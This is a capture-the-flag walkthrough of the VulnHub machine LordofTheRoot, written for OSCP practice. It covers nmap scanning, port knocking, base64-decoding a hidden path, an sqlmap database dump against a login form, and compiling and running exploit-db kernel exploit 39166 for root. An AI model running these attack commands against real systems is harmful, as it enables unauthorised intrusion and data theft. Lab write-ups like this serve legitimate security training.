# LordofTheRoot
I don't know much about Lord of the Rings, but this box was recommended on several sites. As a good machine to practice in prep for the OSCP. So I decided to attempt it.

## Description from VulnHub

"I created this machine to help others learn some basic CTF hacking strategies and some tools. I aimed this machine to be very similar in difficulty to those I was breaking on the OSCP."

Author: KookSec

## Enumeration

After boot the login screen is shown, and gives us **username smeagol**

![Optional Text](/LordofTheRoot/_resources/fa69f71a2a834d72824b33535c54b4d8.png)

***Finding the target machine on the local network***

![Optional Text](/LordofTheRoot/_resources/bf2f53a39ea940bebf649229897c2f67.png)

- `vulnmachine-ipaddress = ***10.0.0.13***`

### NMAP
- `sudo nmap -Pn -sC -sV -oA nmapscans/lotr 10.0.0.13`

![Optional Text](/LordofTheRoot/_resources/a2fd1e3f15b749ce8f2c612cfff77c94.png)

* * *

Looking at the ports I didn't find anything

- `sudo nmap -Pn -p- 10.0.0.13`

***

## Port Knocking

So after a few failed brute forcing and exploit attempts, I tried to ***ssh smeagol@10.0.0.13***
probablay should have done this sooner but nevertheless.

In the image below, I see a hint ***Knock*** and in the banner I see ***Easy as 1,2,3*** After some research I found a reference to ***port knocking***

![Optional Text](/LordofTheRoot/_resources/39a3b3289fb2446db1735e49bcfe05f1.png)

I wasn't to familar with "port knocking". I have only come across a few Vulnerbale Machines that levearge port knocking before, but it had been awhile so I googeled it.

For those who might be interested you can google port knocking and you will have plenty to read. In a nut shell, it's basically a secret handshake. This means the firewall rules are dynamic and once a certain knocking sequnence is achevied the firewall allows predetermined access to a service. On the vulnernable machine I believe this what the directorties `/SECRET/door1/ /SECRET/door2/ /SECRET/door3/` are for. ***I found the directories after getting a shell on the box.***

Found several nmap articles, that show "port knocking" example commands but the one that worked was the following sequnce:

- `nmap -r -Pn -p1,2,3 10.0.0.13`
- `nmap -Pn -p- 10.0.0.13`

I had tried to run the above commands earlier and it didn't work, but after a reboot the above nmap commands did work. I finally see a another service on port `1337`

![Optional Text](/LordofTheRoot/_resources/6e55e7df78404874bf381cf04737fab1.png)

Ran the command `nmap -Pn -p1337 -sV 10.0.0.13` to determine what the service was running. Apache 2.4.7

![Optional Text](/LordofTheRoot/_resources/9d96f87405ac4dd8989779c69e9bcc7a.png)

Ran a quick dirb scan using `dirb http://10.0.0.13:1337/`

```
---- Scanning URL: http://10.0.0.13:1337/ ----
==> DIRECTORY: http://10.0.0.13:1337/images/                                              
+ http://10.0.0.13:1337/index.html (CODE:200|SIZE:64)                                     
+ http://10.0.0.13:1337/server-status (CODE:403|SIZE:291)                                 
                                                                                          
---- Entering directory: http://10.0.0.13:1337/images/ ----
```
Several URLs listed
```
http://10.0.0.13:1337/images/
http://10.0.0.13:1337/index.html
http://10.0.0.13:1337/server-status
http://10.0.0.13:1337/images/
```

Diving into the URLs from the "dirb scan", I didn't find anything anything interesting until trying.

`http://10.0.0.13:1337/index.html/`

**Looking at the Page:**

![Optional Text](/LordofTheRoot/_resources/1f572564dc8d4bec849049b3ab6a9f82.png)

**Viewing the source code I see:**

![Optional Text](/LordofTheRoot/_resources/674acb1f528642eb89e4994a5fd252e7.png)

**Looks like base64 so I ran the standard:**

`echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d`

![Optional Text](/LordofTheRoot/_resources/b0d9bbf984d74d2f9c457c5f9e5ef506.png)

**Once again, it looks like base64 so taking the output of our previous decoding  I see:**

`echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d`

![Optional Text](/LordofTheRoot/_resources/878246becd274df9bac9fe92c161699d.png)

`http://10.0.0.13:1337/978345210/index.php` I see:

![Optional Text](/LordofTheRoot/_resources/72f770e5bd4c4838a3366e1a7f1fe80a.png)

Great! A login this looks promising!

I spent some time enumerating the box and eventually got hit using SQLMAP. This was after many failed login attempts. Don't get discouraged here. I know I did, I was stuck here for a little bit. I looked at several resources to finally get something that would work. Even when I got it to work it took a long time. 

`python3 sqlmap.py -url http://10.0.0.13:1337/978345210/index.php --forms --dbs --level=5 --risk=3 --batch -D Webapp --dump all`

![Optional Text](/LordofTheRoot/_resources/2a7709db8859406cb469a0a8613b4765.png)

Finally a shell

![Optional Text](/LordofTheRoot/_resources/f491c21b66ff4e2fa5502b2a52ac76fa.png)

Unfortunetly I can't sudo!

![Optional Text](/LordofTheRoot/_resources/f12668dc4a784b749247e0c64167b257.png)

I dug around a little bit, but was it was getting late so I decided to run LinPEAS [Link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), I chose the quick method and used filezilla to transfer the file. I then ran LinPEAS on the target machine. LinPEAS will print out alot of informaiton but the first thing I noticed was the OS. So I started and Kernal Version

![Optional Text](/LordofTheRoot/_resources/92d5b693649441e8b8f01d0032470d57.png)

It also list software on the vulnerable machine, that could assist you. I find this very helpful!

![Optional Text](/LordofTheRoot/_resources/c98534210a9b48dfb4b5a71f9418af04.png)

So I googled `Ubuntu 14.04.3 ` exploits

You can find more about the exploit [here](https://www.exploit-db.com/exploits/39166)

I downloaded the Exlploit

- Moved the c file it to the vuln machine using filezilla
- complied it with `gcc 39166.c -o vulnpop`
- ran the exe with `./vulnpop`

Tada! We are root!

![Optional Text](/LordofTheRoot/_resources/7196dff360514c99bf6e5e0db5ff1cc0.png)
